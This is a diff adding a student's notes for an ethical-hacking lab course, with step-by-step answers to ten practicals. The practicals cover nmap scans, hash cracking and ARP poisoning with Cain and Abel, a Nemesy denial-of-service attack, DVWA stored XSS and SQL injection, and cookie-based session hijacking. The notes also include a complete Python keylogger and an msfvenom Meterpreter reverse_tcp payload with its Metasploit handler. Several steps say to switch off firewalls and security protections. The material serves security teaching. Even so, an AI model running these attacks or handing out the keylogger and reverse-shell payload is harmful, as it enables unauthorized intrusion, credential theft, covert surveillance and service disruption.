@@ -1,0 +1,238 @@
+Q. Perform network scanning on www.sports.com to find number of active machines and no of packets send.
+nslookup www.sports.com
+nmap -sn <resolved-IP-subnet>
+ping -c 4 www.sports.com
+ 
+Q. Find the number of hops taken by your system to send information from your computer to www.google.com
+tracert www.google.com
+ 
+Q. Execute the following tasks: 
+a) Perform network scan. -> nmap -sP 192.168.1.0/24
+b) Find active machines. -> arp -a or nmap -sn 192.168.1.0/24
+c) Find number of hops from source to destination. -> tracert www.google.com
+d) Perform ping command -> ping www.google.com
+ 
+Q. Find the number of hops from your PC to www.prestashop.com
+tracert www.prestashop.com
+ 
+Q. Use Ping and IP Scanner to scan the network. List your findings.
+ping 192.168.1.1
+ifconfig or nmap -sn 192.168.1.0/24
+ 
+Q. Port Scanning with Nmap
+ACK: nmap -sA -T4 scanme.nmap.org
+SYN: nmap -p 22,113,139 scanme.nmap.org
+FIN: nmap -sF -T4 192.168.0.101
+NULL: nmap -sN -p 22 scanme.nmap.org
+XMAS: nmap -sX -T4 scanme.nmap.org
+ 
+Intense Scan: nmap -T4 -A -v 192.168.0.101
+ 
+Q. Creating a Keylogger with Python
+------
+from pynput.keyboard import Listener
+import logging
+log_file="keylog.txt"
+logging.basicConfig(filename=log_file,level=logging.DEBUG,format="%(asctime)s: %(message)s")
+def on_press(key):
+    try:
+        logging.info(str(key))
+    except Exception as e:
+        print(f"Error: {e}")
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+
+Practical_1: Google and Whois Reconnaissance
+• Use Google search techniques to gather information about a specific target or organization.
+• Utilize advanced search operators to refine search results and access hidden information.
+• Perform Whois lookups to retrieve domain registration information and gather details about the target's infrastructure.
+-----------------------
+Search any website like https://www.india.gov.in/ which u want to get the information
+Go to https://who.is/ or https://www.whois.com/whois/ to get the detail
+Paste the website link to get detail
+Check all information in both the website
+ 
+--------------------------------------------
+Practical_2: Password Encryption and Cracking with CrypTool and Cain and Abel
+• Password Encryption and Decryption:
+o Use CrypTool to encrypt passwords using the RC4 algorithm.
+o Decrypt the encrypted passwords and verify the original values.
+• Password Cracking and Wireless Network Password Decoding:
+o Use Cain and Abel to perform a dictionary attack on Windows account passwords.
+o Decode wireless network passwords using Cain and Abel's capabilities.
+-----------------------
+Install and Open *Cryptool* 
+Go to File -> New -> Write some message -> Save the file
+Go to Encrypt/Decrypt in nav -> Symmetric(Modern) -> RC4 -> Key Length(16) and Encrypt -> Save the file
+Again Go to Encrypt/Decrypt in nav -> Symmetric(Modern) -> RC4 -> Key Length(16) and Decrypt
+-----
+Disable all security and install cain and abel tool (Pass- Darknet123)
+Open it and go to tool section -> Select hash calculator -> Enter Text (Password) -> Copy MD5 Hash Value
+Go to Cracker section -> Select MD5 hashes and click on + -> Paste the MD5 hash value
+Right Click on value -> Dictionary attack -> Add wordlist text file -> Start
+Password cracked !!
+ 
+--------------------------------------------
+Practical_3: Linux Network Analysis and ARP Poisoning
+• Linux Network Analysis:
+o Execute the ipconfig command to retrieve network interface information.
+o Use the ping command to test network connectivity and analyze the output.
+o Analyze the netstat command output to view active network connections.
+o Perform a traceroute to trace the route packets take to reach a target host.
+• ARP Poisoning:
+o Use ARP poisoning techniques to redirect network traffic on a Windows system.
+o Analyze the effects of ARP poisoning on network communication and security.
+-----------------------
+Open CMD -> Type the command
+ipconfig
+ping www.google.com
+netstat
+tracert www.google.com
+---
+Open Cain and abel 
+Click on 2nd Icon (Start/Stop Sniffer) and select desired adapter
+Click on sniffer button -> Click (+) -> Select range -> All test -> OK
+It will show connected host -> click ARP button (bottom) 
+Click on (+) -> Click 3rd Icon (Start/Stop Arp) 
+Select any ipv4 address from left and select all ip address -> OK
+Go to vulnweb login page and enter detail -> click login
+Go to password tab (bottom) -> HTTP -> Details shown
+ 
+--------------------------------------------
+Practical_4: Port Scanning with Nmap
+• Use NMap to perform an ACK scan to determine if a port is filtered, unfiltered, or open.
+• Perform SYN, FIN, NULL, and XMAS scans to identify open ports and their characteristics.
+• Analyze the scan results to gather information about the target system's network services.
+-----------------------
+Install Nmap and open cmd -> nmap (To check if exist)
+Write following command in cmd (Run as admin) or nmap -> 
+ACK: nmap -sA -T4 scanme.nmap.org
+SYN: nmap -p 22,113,139 scanme.nmap.org
+FIN: nmap -sF -T4 192.168.0.101
+NULL: nmap -sN -p 22 scanme.nmap.org
+XMAS: nmap -sX -T4 scanme.nmap.org
+ 
+(Intense Scan: nmap -T4 -A -v 192.168.0.101)
+ 
+--------------------------------------------
+Practical_5: Network Traffic Capture and DoS Attack with Wireshark and Nemesy
+• Network Traffic Capture:
+o Use Wireshark to capture network traffic on a specific network interface.
+o Analyze the captured packets to extract relevant information and identify potential security issues.
+• Denial of Service (DoS) Attack:
+o Use Nemesy to launch a DoS attack against a target system or network.
+o Observe the impact of the attack on the target's availability and performance.
+-----------------------
+Install wireshark and open it
+Select Lan or Wifi -> Filter -> http 
+Go to website http://testphp.vulnweb.com/login.php and give details -> Login
+Stop the capture -> Find post method -> Hypertext transfer protocol 
+Under HTML form URL encoded -> Username and password can be seen
+---
+Download nemesy tool: https://packetstorm.news/files/id/25599 
+(Turn off chrome setting -> privacy & security -> Security -> No protection)
+Extract the zip file and run nemesy.exe as administrator
+Give ip address -> Size (65000) -> Delay(1000) -> Start
+Win+R -> resmon -> network tab -> Sudden increase in traffic 
+(Halt to stop the attack)
+ 
+--------------------------------------------
+Practical_6: Persistent Cross-Site Scripting Attack
+• Set up a vulnerable web application that is susceptible to persistent XSS attacks.
+• Craft a malicious script to exploit the XSS vulnerability and execute arbitrary code.
+• Observe the consequences of the attack and understand the potential risks associated with XSS vulnerabilities.
+-----------------------
+Open the Xampp -> Start Apache and MySQL
+Extract and Copy the dvwa_master file and paste it into C:\xampp\htdocs -> Rename to dvwa
+Open dvwa folder and then open the config folder. Rename the file config.inc.php.dist to config.inc.php.
+Open the config file to view your database, username and password. Copy password
+Go to http://localhost/phpmyadmin/ -> Select new option -> Create database "dvwa"
+Click on "dvwa" and Go to privilege tab -> click add user account option
+Fill the user name, password acquired from the config.inc.php file -> click on Go button at the bottom.
+Go to http://localhost/dvwa/login.php and enter the username as “admin” and password as “password”.
+After login -> click select the DVWA Security option at the bottom from the left tab and set the security level to “Low”.
+Select XSS (Stored) option from the left tab. Enter the name as test_1 and message as:
+-> <script>alert("Hello there!")</script>
+Click on Sign Guestbook option which will show you an alert dialog box saying “Hello there!”.
+ 
+--------------------------------------------
+Practical_7: Session Impersonation with Firefox and Tamper Data
+• Install and configure the Tamper Data add-on in Firefox.
+• Intercept and modify HTTP requests to impersonate a user's session.
+• Understand the impact of session impersonation and the importance of session management.
+-----------------------
+Open Firefox -> Go to Firefox add-on 
+Search Tamper-data and add then Search Cookie Editor and add
+Go to https://www.techpanda.org/ and enter details as 
+Email: admin@google.com
+Password: Password2010
+Click on cookie-editor and copy cookie session 
+Go to setting -> privacy and security -> clear data
+Click on tamper-data -> click yes
+Go to https://www.techpanda.org/ and window will appear
+Go to https://www.techpanda.org/index.php -> click OK
+Add cookie header and paste the session id -> OK
+Same for dashboard page -> Click ok -> Add cookie header and session id
+You will be logged into dashboard without entering login details
+ 
+--------------------------------------------
+Practical_8: SQL Injection Attack
+• Identify a web application vulnerable to SQL injection.
+• Craft and execute SQL injection queries to exploit the vulnerability.
+• Extract sensitive information or manipulate the database through the SQL injection attack
+-----------------------
+Open the Xampp -> Start Apache and MySQL
+Extract and Copy the dvwa_master file and paste it into C:\xampp\htdocs -> Rename to dvwa
+Open dvwa folder and then open the config folder. Rename the file config.inc.php.dist to config.inc.php.
+Open the config file to view your database, username and password. Copy password
+Go to http://localhost/phpmyadmin/ -> Select new option -> Create database "dvwa"
+Click on "dvwa" and Go to privilege tab -> click add user account option
+Fill the user name, password acquired from the config.inc.php file -> click on Go button at the bottom.
+Go to http://localhost/dvwa/login.php and enter the username as “admin” and password as “password”.
+After login -> click select the DVWA Security option at the bottom from the left tab and set the security level to “Low”.
+Navigate to SQL Injection tab and enter the following User ID as 1, 2, 3 and 1=1.
+ 
+--------------------------------------------
+Practical_9: Creating a Keylogger with Python
+• Write a Python script that captures and logs keystrokes from a target system.
+• Execute the keylogger script and observe the logged keystrokes.
+• Understand the potential security risks associated with keyloggers and the importance of protecting against them.
+-----------------------
+Open Cmd change path to python script -> pip install pynput
+---
+from pynput.keyboard import Listener
+import logging
+log_file="keylog.txt"
+logging.basicConfig(filename=log_file,level=logging.DEBUG,format="%(asctime)s: %(message)s")
+def on_press(key):
+    try:
+        logging.info(str(key))
+    except Exception as e:
+        print(f"Error: {e}")
+with Listener(on_press=on_press) as listener:
+    listener.join()
+----
+Check log file for keylogs and kill the program to stop
+ 
+--------------------------------------------
+Practical_10: Exploiting with Metasploit (Kali Linux)
+• Identify a vulnerable system and exploit it using Metasploit modules.
+• Gain unauthorized access to the target system and execute commands or extract information.
+• Understand the ethical considerations and legal implications of using Metasploit for penetration testing.
+-----------------------
+Open the terminal in Kali Linux as root and use the following command: apt-get update && apt-get upgrade
+Check the IP addresses of both the systems (hacker and victim):
+Ping the victim system to check connection
+Now we will create a payload (hack.exe) by typing the following command:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.76 LPORT=4441 -f exe -o hack.exe
+After creating payload, we will launch Metasploit with the following command: msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST 192.168.2.76
+> set LPORT 4441
+> exploit
+Now run hack.exe in the victim’s system after turning off the windows firewall and other security settings.
+We will use the command sysinfo to check the system information of the victim’s system.
+We can also use the screenshare command to see the live screen of the victim’s system
